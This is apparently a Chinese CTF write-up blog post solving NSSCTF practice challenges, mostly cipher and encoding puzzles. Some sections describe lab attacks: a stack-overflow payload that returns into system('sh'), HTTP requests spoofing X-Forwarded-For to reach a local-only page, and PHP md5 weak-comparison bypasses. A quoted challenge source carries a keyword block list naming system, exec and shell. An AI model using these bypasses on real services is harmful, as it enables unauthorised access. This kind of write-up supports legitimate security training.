---
title: 2025 NSSCTF
permalink: /2026/03/15/Capture_The_Flag_夺旗赛/夺旗赛Write-up/2025 NSSCTF/
date: 2026-03-15 13:28:20
categories:
  - Capture_The_Flag_夺旗赛
  - 夺旗赛Write-up
  - NSSCTF
tags:
  - CTF
  - WriteUp
  - NSSCTF
created: 2026-03-15T16:49
updated: 2026-04-17T06:53
---

# 2025 NSSCTF 积累之（一）
## 1.Crypto

### [CryptoCTF_2020]One_Line_Crypto

![](<2025 NSSCTF/file-20260331130230861.png>)

```python
from Crypto.Util.number import *
from secret import m, n, x, y, flag

p, q = x**(m+1) - (x+1)**m, y**(n+1) - (y+1)**n
assert isPrime(p) and isPrime(q) and p < q < p << 3 and len(bin(p*q)[2:]) == 2048
enc = bytes_to_long(flag)
print(pow(enc, 0x10001, p*q))
```

enc文件：14608474132952352328897080717325464308438322623319847428447933943202421270837793998477083014291941466731019653023483491235062655934244065705032549531016125948268383108879698723118735440224501070612559381488973867339949208410120554358243554988690125725017934324313420395669218392736333195595568629468510362825066512708008360268113724800748727389663826686526781051838485024304995256341660882888351454147057956887890382690983135114799585596506505555357140161761871724188274546128208872045878153092716215744912986603891814964771125466939491888724521626291403272010814738087901173244711311698792435222513388474103420001421

### [鹤城杯 2021]easy_crypto
#### #古典密码 #词频分析
> 公正公正公正诚信文明公正民主公正法治法治诚信民主自由敬业公正友善公正平等平等法治民主平等平等和谐敬业自由诚信平等和谐平等公正法治法治平等平等爱国和谐公正平等敬业公正敬业自由敬业平等自由法治和谐平等文明自由诚信自由平等富强公正敬业平等民主公正诚信和谐公正文明公正爱国自由诚信自由平等文明公正诚信富强自由法治法治平等平等自由平等富强法治诚信和谐
>

社会主义核心价值观解密：

![](<2025 NSSCTF/file-20260331130228808.png)

flag{IlUqU9O5guX6YiITsRNPiQmbhNRjGuTP}

### 2.Web

### [BJDCTF 2020]base??
#### #Base家族 #古典密码 #其他
> dict:{0: 'J', 1: 'K', 2: 'L', 3: 'M', 4: 'N', 5: 'O', 6: 'x', 7: 'y', 8: 'U', 9: 'V', 10: 'z', 11: 'A', 12: 'B', 13: 'C', 14: 'D', 15: 'E', 16: 'F', 17: 'G', 18: 'H', 19: '7', 20: '8', 21: '9', 22: 'P', 23: 'Q', 24: 'I', 25: 'a', 26: 'b', 27: 'c', 28: 'd', 29: 'e', 30: 'f', 31: 'g', 32: 'h', 33: 'i', 34: 'j', 35: 'k', 36: 'l', 37: 'm', 38: 'W', 39: 'X', 40: 'Y', 41: 'Z', 42: '0', 43: '1', 44: '2', 45: '3', 46: '4', 47: '5', 48: '6', 49: 'R', 50: 'S', 51: 'T', 52: 'n', 53: 'o', 54: 'p', 55: 'q', 56: 'r', 57: 's', 58: 't', 59: 'u', 60: 'v', 61: 'w', 62: '+', 63: '/', 64: '='}
>
> chipertext:
>
> FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw
>

```python
#!/usr/bin/env python3
# coding=utf-8
# Custom Base64 mapping
dictionary = {
    0: 'J', 1: 'K', 2: 'L', 3: 'M', 4: 'N', 5: 'O', 6: 'x', 7: 'y', 8: 'U', 9: 'V',
    10: 'z', 11: 'A', 12: 'B', 13: 'C', 14: 'D', 15: 'E', 16: 'F', 17: 'G', 18: 'H',
    19: '7', 20: '8', 21: '9', 22: 'P', 23: 'Q', 24: 'I', 25: 'a', 26: 'b', 27: 'c',
    28: 'd', 29: 'e', 30: 'f', 31: 'g', 32: 'h', 33: 'i', 34: 'j', 35: 'k', 36: 'l',
    37: 'm', 38: 'W', 39: 'X', 40: 'Y', 41: 'Z', 42: '0', 43: '1', 44: '2', 45: '3',
    46: '4', 47: '5', 48: '6', 49: 'R', 50: 'S', 51: 'T', 52: 'n', 53: 'o', 54: 'p',
    55: 'q', 56: 'r', 57: 's', 58: 't', 59: 'u', 60: 'v', 61: 'w', 62: '+', 63: '/',
    64: '='
}

# Ciphertext to decrypt
ciphertext = "FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw"

def decrypt_custom_base64(ciphertext, mapping):
    # Create reverse mapping: character to index
    reverse_mapping = {v: k for k, v in mapping.items()}
    
    # Convert ciphertext to list of indices
    indices = []
    for char in ciphertext:
        if char in reverse_mapping:
            indices.append(reverse_mapping[char])
        else:
            print(f"Warning: Character '{char}' not found in mapping")
    
    # Convert indices to binary data (6 bits per index)
    binary_str = ''
    for idx in indices:
        # Convert to 6-bit binary string
        binary_str += f"{idx:06b}"
    
    # Convert binary string to bytes
    # Pad to make length multiple of 8
    padding = len(binary_str) % 8
    if padding > 0:
        binary_str = binary_str[:-padding]  # Remove padding bits
    
    # Convert to bytes
    bytes_data = bytearray()
    for i in range(0, len(binary_str), 8):
        byte = binary_str[i:i+8]
        if byte:
            bytes_data.append(int(byte, 2))
    
    return bytes_data

# Decrypt the ciphertext
decrypted_bytes = decrypt_custom_base64(ciphertext, dictionary)

# Try different encodings to get readable text
print("Decrypted results:")
print("UTF-8:", decrypted_bytes.decode('utf-8', errors='replace'))
print("ASCII:", decrypted_bytes.decode('ascii', errors='replace'))
print("HEX:", decrypted_bytes.hex())
print("Raw bytes:", decrypted_bytes)

# Also try checking if it's a standard encoding with custom mapping
# Let's see the standard Base64 characters for comparison
standard_base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
print("\nStandard Base64 mapping for comparison:")
for i in range(64):
    if i in dictionary and dictionary[i] != standard_base64[i]:
        print(f"Index {i}: Custom='{dictionary[i]}', Standard='{standard_base64[i]}'")

if __name__ == "__main__":
    pass
```

BJD{D0_Y0u_kNoW_Th1s_b4se_map}

### [HGAME 2022 week1]Matryoshka
#### #维吉尼亚 #凯撒密码 #摩斯代码
> 为了学好四六级，协会里某不知名的康师傅决定通过看英文小说来提高自己的英语水平。
>
> 可不知道为什么，下载来的小说竟然都被打乱并加密了。
>
> 他费尽千辛万苦重要找到了一部分小说的原文，你能帮帮他么？
>

> ⠨⠨⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠤⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠨⠨⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠤⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠤⠤⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠨⠤⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠨⠨⠌⠨⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠨⠨⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠤⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠤⠤⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠨⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠨⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠤⠨⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠨⠨⠨⠌⠨⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠤⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠨⠨⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠤⠤⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠤⠨⠌⠨⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠤⠤⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠤⠤⠤⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠨⠨⠨⠌⠨⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠨⠨⠨⠨⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠨⠨⠨⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠤⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠤⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠤⠤⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠨⠨⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠤⠤⠤⠌⠨⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠨⠤⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠨⠨⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠤⠤⠤⠌⠨⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠤⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠨⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠨⠨⠨⠨⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠨⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠤⠨⠤⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠨⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠨⠌⠨⠨⠨⠤⠤⠌⠤⠤⠨⠨⠤⠤⠌⠤⠤⠤⠨⠨⠌⠤⠨⠨⠨⠨⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠤⠌⠨⠨⠨⠨⠤⠌⠤⠤⠨⠨⠤⠤⠌⠨⠨⠨⠨⠤⠌⠤⠨⠨⠨⠨
>
> Caesar：21; Vigenère:hgame
>

先盲文解密看看

![](<2025 NSSCTF/file-20260331130228090.png)

发现解密后开头不太对：

![](<2025 NSSCTF/file-20260331130228015.png)

试着反转一下再解密

![](<2025 NSSCTF/file-20260331130228099.png)

> 46,66,42,75,66,45,46,6E,6D,4C,73,36,44,33,73,69,59,74,4C,36,58,32,70,34,69,4E,30,63,64,53,6C,79,6B,6D,39,72,51,4E,39,6F,4D,53,31,6A,6B,73,39,72,4B,32,52,36,6B,4C,38,68,6F,72,30,3D
>

16进制特征。

```plain
str='46,66,42,75,66,45,46,6E,6D,4C,73,36,44,33,73,69,59,74,4C,36,58,32,70,34,69,4E,30,63,64,53,6C,79,6B,6D,39,72,51,4E,39,6F,4D,53,31,6A,6B,73,39,72,4B,32,52,36,6B,4C,38,68,6F,72,30,3D'
for i in str:
    str=str.replace(',','')
print(str)
```

> 466642756645466E6D4C73364433736959744C3658327034694E306364536C796B6D3972514E396F4D53316A6B7339724B3252366B4C38686F72303D
>

![](<2025 NSSCTF/file-20260331130228081.png)

FfBufEFnmLs6D3siYtL6X2p4iN0cdSlykm9rQN9oMS1jks9rK2R6kL8hor0=

然而直接base解码并不成功。

根据题目提示：维吉尼亚密码的key是hgame。不妨先试一下，因为解完末端依旧是=号，然后再base64可能性大一点。

![](<2025 NSSCTF/file-20260331130228063.png)

YzBibXZnaHl6X3swUmF6X2d4eG0wdGhrem9fMG9iMG1fdm9rY2N6dF8hcn0=

![](<2025 NSSCTF/file-20260331130228072.png)

c0bmvghyz_{0Raz_gxxm0thkzo_0ob0m_vokcczt_!r}

根据题目：凯撒21位

![](<2025 NSSCTF/file-20260331130228054.png)

h0gralmde_{0Wfe_lccr0ympet_0tg0r_atphhey_!w}

最后栅栏密码解密：

![](<2025 NSSCTF/file-20260331130228036.png)

hgame{Welc0me_t0_the_w0rld_0f_crypt0graphy!}

## 2.Web

### [M1r4n]冰蝎的秘密

#### #流量分析 #Webshell流量
##### 题目描述：在一次网络安全的挑战中，你截获了一段神秘的冰蝎流量。据说这段流量中隐藏着重要的信息。你能解开这个谜团，找出隐藏在流量中的秘密吗？
解答：

![](<2025 NSSCTF/file-20260331130230820.png>)

流量包损坏。需要修复

 法一：CTFNetA修复

法二：使用pcapfix修复

法三：使用010 editor，与正常流量对照手动修复

### [陇剑杯 2021]webshell（问1）
#### #流量分析 #Webshell #流量日志审计
单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：  
黑客登录系统使用的密码是_____________。

![](<2025 NSSCTF/file-20260331130228438.png)

NSSCTF{Admin123!@#}

### [SWPUCTF 2021 新生赛]easy_md5 lamaper
#### #弱比较 #PHP #数组绕过
既要两变量个值不相同，又要两个变量md5值一样。  
可以发现此时判断md5值是否一样用的是`==`，这是php的弱类型比较，  
**方法一：** 可以使用带0e开头的数字穿进行传递参数，因为php会将0e开头的数字转化为0，故此时md5值相等，而两个变量值不相等；  
**方法二：** 可以传递数组，如name[]=123,password[]=456，md5不能加密数组，故两个md5返回的都是null

另：若遇到`===`这样的强类型比较，方法一就失效了，方法二仍然有效，或者还可以使用软件fastcoll进行md5碰撞，生成两个字符串使得他们的md5值相同

### Misc

### [SWPUCTF 2021 新生赛]Do_you_know_http
#### #HTTP协议 #信息收集 #PHP
法一：Hackbar

![](<2025 NSSCTF/file-20260331130228378.png)

![](<2025 NSSCTF/file-20260331130228370.png)

修改User Agent为WLLM，EXECUTE

![](<2025 NSSCTF/file-20260331130228361.png)

先把URL改为a.php，再添加X-Forward-For为127.0.0.1

![](<2025 NSSCTF/file-20260331130228351.png)

NSSCTF{4732ec48-fa30-4e78-93c3-3fafe98452b8}

## 3.Misc

### [陇剑杯_2021]签到

> 题目描述：
>
> 此时正在进行的可能是__________协议的网络攻击。（如有字母请全部使用小写，填写样例：http、dns、ftp）。得到的flag请使用NSSCTF{}格式提交。
>

![](<2025 NSSCTF/file-20260331130230769.png>)

NSSCTF{http}

### [LitCTF 2023]这羽毛球怎么只有一半啊（恼 (初级)
#### #宽高修改 #图片隐写 #图片修复
题目：所以下半身是什么呢（ww

+ 解压出一个可爱的小草神.png![](<2025 NSSCTF/file-20260331130228827.png)
+ 题目提示图片缺少下半部分，故使用[随波逐流]CTF编码工具修复高宽![](<2025 NSSCTF/file-20260331130228817.png)

LitCTF{Fl4g_0fcourse!}

### Crypto

### [SDCTF 2022]Susan Album Party
#### #图片隐写 #图片分离 #结构隐写
 My friend Susan is having a photo album party, but she accidentally corrupted the SD card with all her photos on it! Can you save Susan's party by recovering her photos?

附件：stub

![](<2025 NSSCTF/file-20260331130228545.png)

查看发现是jpeg格式。修改后缀：

![](<2025 NSSCTF/file-20260331130228528.png)

题目photos提示有多个图片。可能是叠在一起了。

 binwalk和foremost并未提取出结果               

搜索FF D8 FF EE 出现三个结果。

![](<2025 NSSCTF/file-20260331130228553.png)

把另外两个图片复制出来保存。

![](<2025 NSSCTF/file-20260331130228509.png)

![](<2025 NSSCTF/file-20260331130228491.png) 

这里很坑，明明写得像SOME结果说是S0ME。看来该leet还得leet。        

sdctf{FFD8_th3n_S0ME_s7uff_FFD9}

### Web

### [NSSRound#V Team]画出一个flag
#### #LSB #MISC #图片隐写
![](<2025 NSSCTF/file-20260331130228213.png)

![](<2025 NSSCTF/file-20260331130228195.png)

翻了一下，无特别的信息。

使用Stegsolve查看LSB

![](<2025 NSSCTF/file-20260331130228163.png)

保存为zip，解压出一个flag.dat

根据题目名提示flag是画出来的。于是尝试base64解码后转为01字符串：

```python
import base64
with open('C:/Users/glj07/Desktop/flag.dat', 'rb') as file:
    encoded_data = file.read()
decoded_data = base64.b64decode(encoded_data)
binary_string=''.join(format(byte,'08b')for byte in decoded_data)
with open('flag.txt', 'w', encoding='utf-8') as f:
    f.write(binary_string)
```

缩小看的确暗藏玄机。

![](<2025 NSSCTF/file-20260331130228204.png)

需要不断调整窗口比例和缩放比例，直至能辨认无误。看得那叫一个老眼昏花。

![](<2025 NSSCTF/file-20260331130228154.png)

这样不错，最清楚了

NSSCTF{!!Draw_draw_A_flag!!}

## 4.Pwn

### [WUSTCTF 2020]getshell2 
#### #栈溢出 #ret2syscall #栈
附件：service

题目环境：

直接file+checksec

![](<2025 NSSCTF/file-20260331130228790.png)

只开启了栈不可执行，应该是栈溢出题目。

使用ROPgadget

![](<2025 NSSCTF/file-20260331130228771.png)

找到了sh地址：0x08048670 

直接写死：sh_addr = 0x08048670

![](<2025 NSSCTF/file-20260331130228763.png)





栈溢出（Stack Overflow） 漏洞：

+ 程序执行完一个函数后，会跳回它被调用的地方，即返回地址（存于栈上）
+ 当攻击者输入超长数据后,会覆盖返回地址（Return Address）

![](<2025 NSSCTF/file-20260331130228754.png)

+ `gets()`、`strcpy()` 等属于没有边界检查的函数。

🛠️ 六、完整攻击流程

1. **连接远程服务**
2. **p = remote('ip', port)**

**构造 payload**

    - 填充 28 字节到返回地址位置
    - 覆盖返回地址为 `system`
    - 提供 fake return 和 `"sh"` 地址
3. **发送 payload**

```plain
Python

编辑


1p.sendline(payload)
```

4. **进入交互模式，输入命令**

```plain
Python

编辑


1p.interactive()  # 之后你就可以输入 ls, cat flag.txt 等
```

Q1: 为什么不用 `"/bin/sh"`，而用 `"sh"`？

很多题目为了简化，只放了 `"sh"`。

在 Linux 中，`system("sh")` 和 `system("/bin/sh")` 效果几乎一样，都能弹 shell。

Q2: `0xdeadbeef` 是什么？会 crash 吗？

它只是一个“占位符”，表示“随便填个地址”。

只要你在 `system` 返回前已经拿到 shell，程序是否 crash 都不影响你读 flag。

Q3: 为什么偏移是 28（0x18+4）？

`0x18 = 24` 字节是 buffer 大小

`+4` 是 saved ebp（旧的栈基址指针）

总共 28 字节后，才是返回地址

### 5.Reverse

## 5.Reverse

### [BJDCTF_2020]Easy

附件：easy.exe

无壳程序，直接分析即可

![](<2025 NSSCTF/file-20260331130230842.png>)

# 2025 NSSCTF 积累之（二）
## 1.Crypto

### [SWPUCTF_2021_新生赛]ez_caesar

#凯撒密码 #Base家族 #古典密码

```python
import base64
def caesar(plaintext):
    str_list = list(plaintext)
    i = 0
    while i < len(plaintext):
        if not str_list[i].isalpha():
            str_list[i] = str_list[i]
        else:
            a = "A" if str_list[i].isupper() else "a"
            str_list[i] = chr((ord(str_list[i]) - ord(a) + 5) % 26 + ord(a) or 5)
        i = i + 1

    return ''.join(str_list)

flag = "*************************"
str = caesar(flag)
print(str)

#str="U1hYSFlLe2R0em1mYWpwc3RiaGZqeGZ3fQ=="
```

NSSCTF{youhaveknowcaesar}
![](<2025 NSSCTF/file-20260331130230871.png>)

### [SWPU 2019]伟大的侦探
#### #跳舞的小人 #编码分析 #编码转换
 附件压缩包里一个txt文本，一个加密文件夹

![](<2025 NSSCTF/file-20260331130228701.png)

将密码.txt放入010 editor

![](<2025 NSSCTF/file-20260331130228665.png)

![](<2025 NSSCTF/file-20260331130228632.png)

> wllm_is_the_best_team!
>

解压得到：![](<2025 NSSCTF/file-20260331130228648.png)

网上搜索跳舞的小人解码图：

![](<2025 NSSCTF/file-20260331130228656.jpeg)

flag{iloveholmesandwllm}

### 4.Web

### [LitCTF 2023]Hex？Hex！(初级)
#### #古典密码 #Base家族 #其他
题目描述: 如果你也和我一样知道hex的话，那我觉得，这件事，太酷啦！

> 4c69744354467b746169313131636f6f6c6c616161217d
>

十六进制转字符即可

![](<2025 NSSCTF/file-20260331130228343.png)

LitCTF{tai111coollaaa!}



### Crypto

### [BJDCTF 2020]encode
#### #Base64 #RC4 #XOR
**附件：**

![](<2025 NSSCTF/file-20260331130227858.png)

![](<2025 NSSCTF/file-20260331130227868.png)拿到题目首先upx脱壳。再ida32分析：

![](<2025 NSSCTF/file-20260331130227877.png)

![](<2025 NSSCTF/file-20260331130227886.png)

```python
int sub_804887C()
{
  int v0; // eax
  int result; // eax
  unsigned int i; // [esp+Ch] [ebp-FCh]
  unsigned int v3; // [esp+10h] [ebp-F8h]
  unsigned int v4; // [esp+14h] [ebp-F4h]
  char v5[48]; // [esp+1Ah] [ebp-EEh] BYREF
  char v6[178]; // [esp+4Ah] [ebp-BEh] BYREF
  unsigned int v7; // [esp+FCh] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  strcpy(v5, "Flag{This_a_Flag}");
  v3 = sub_805BBD0(v5);
  strcpy(v6, "E8D8BD91871A1E56F53F4889682F96142AF2AB8FED7ACFD5E");
  sub_804F950("Please input your flag:");
  sub_806DA80(0, &v6[50], 256);
  if ( sub_805BBD0(&v6[50]) != 21 )
    sub_804EAF0(0);
  v0 = sub_8048AC2(&v6[50]);
  sub_80481D0(&v5[18], v0);
  v4 = sub_805BBD0(&v5[18]);
  for ( i = 0; i < v4; ++i )
    v5[i + 18] ^= v5[i % v3];
  sub_8048E24(&v5[18], v4, v5, v3);
  if ( !sub_8048280(&v5[18], v6) )
    sub_804EAF0(0);
  sub_804F950("right!");
  result = 0;
  if ( __readgsdword(0x14u) != v7 )
    sub_806FA00();
  return result;
```

## 2.Web

### [SWPUCTF_2021_新生赛]easy_sql

[http://node4.anna.nssctf.cn:28049/](http://node4.anna.nssctf.cn:28049/)

### Do_you_know_http

_**一、看题目环境：**_

环境页面显示：  
Please use 'WLLM' browser!  
意思为：

```plain
请使用“ wllm”浏览器！
```

好看到这里都可以了，去用burp suite进行抓包改请求。

_**二、使用工具burp suite进行抓包，并对其中参数有所理解：**_

GET:到  
Host:来自  
User-Agent: 用户-代理  
Upgrade-Insecure-Requests: 升级-不安全的-请求  
Content-Length: 内容长度  
Cache-Control: 缓存-控制  
X-Forwarded-For: HTTP的请求端真实的IP  
Request: 请求  
Response: 响应

_**三、抓包分析改请求，拿flag：**_

打开环境用burp suite进行抓包  
返回数据：  
GET /hello.php HTTP/1.1

```plain
Host: node2.anna.nssctf.cn:28873

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```

题目环境中告诉我们说要用WLLM浏览器，所以我们须要改User-Agent的值为WLLM  
GET /hello.php HTTP/1.1

```plain
Host: node2.anna.nssctf.cn:28873

User-Agent:WLLM

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```

鼠标右键Send to Repeater送去重放  
返回结果为：  
HTTP/1.1 302 Found #发现

```plain
Date: Fri, 21 Jul 2023 12:52:27 GMT            #日期

Server: Apache/2.4.25 (Debian)                 #服务器

X-Powered-By: PHP/5.6.40                       #动力来自于a

Location: ./a.php                              #位置

Content-Length: 7                              #内容长度

Connection: close                              #连接

Content-Type: text/html; charset=UTF-8         #内容类型

success                                        #成功
```

# 在Location位置发现关键PHP文件：a.php
在GET位置将hello.php文件修改为a.php并点击Send发送：  
GET /a.php HTTP/1.1

```plain
Host: node2.anna.nssctf.cn:28873

User-Agent:WLLM

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```

返回结果为：  
HTTP/1.1 200 OK

```plain
Date: Fri, 21 Jul 2023 13:01:28 GMT

Server: Apache/2.4.25 (Debian)

X-Powered-By: PHP/5.6.40

Content-Length: 64

Connection: close

Content-Type: text/html; charset=UTF-8

You can only read this at local!<br>Your address123.9.161.232
最后一句话告诉我们只能在本地可以进行访问
```

所有我们要在Request请求中添加：X-Forwarded-For:127.0.0.1（需注意的是任意行都可以添加除了第一行，有时候也不对，有的位置可以，有的位置不可以，总之多试试。冒号:注意是英文冒号！）  
GET /a.php HTTP/1.1

```plain
X-Forwarded-For:127.0.0.1

Host: node2.anna.nssctf.cn:28873

User-Agent:WLLM

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```

返回结果为：  
HTTP/1.1 302 Found

```plain
Date: Fri, 21 Jul 2023 13:14:35 GMT

Server: Apache/2.4.25 (Debian)

X-Powered-By: PHP/5.6.40

Location: ./secretttt.php

Content-Length: 60

Connection: close

Content-Type: text/html; charset=UTF-8

You can only read this at local!<br>Your address127.0.0.1
```

# 在Location位置发现重要的php文件：secretttt.php
在GET位置将a.php修改为secretttt.php并点击Send进行发送：  
GET /secretttt.php HTTP/1.1

```plain
X-Forwarded-For:127.0.0.1

Host: node2.anna.nssctf.cn:28873

User-Agent:WLLM

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```

返回结果为：  
HTTP/1.1 200 OK

```plain
Date: Fri, 21 Jul 2023 13:28:23 GMT

Server: Apache/2.4.25 (Debian)

X-Powered-By: PHP/5.6.40

Content-Length: 44

Connection: close    

Content-Type: text/html; charset=UTF-8

NSSCTF{0bbd067c-24bd-454c-9111-6cd1b67b6da4}
```

# 拿到flag：
```plain
#NSSCTF{0bbd067c-24bd-454c-9111-6cd1b67b6da4}
```

### [BJDCTF 2020]Ezphp
#### #数组绕过 #正则绕过 #弱比较 #PHP的类型转换 #伪协议 #extract函数的使用 #sha1碰撞
环境：http://node4.anna.nssctf.cn:28905/

![](<2025 NSSCTF/file-20260331130228589.png)

Ctrl+U查看源代码

![](<2025 NSSCTF/file-20260331130228562.png)

**GFXEIM3YFZYGQ4A=**显然是线索。

全大写+等号，推测是base32编码。放入CyberChef解码。

![](<2025 NSSCTF/file-20260331130228536.png)

```php
<?php
  highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
  if (
    preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
  )  
    die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
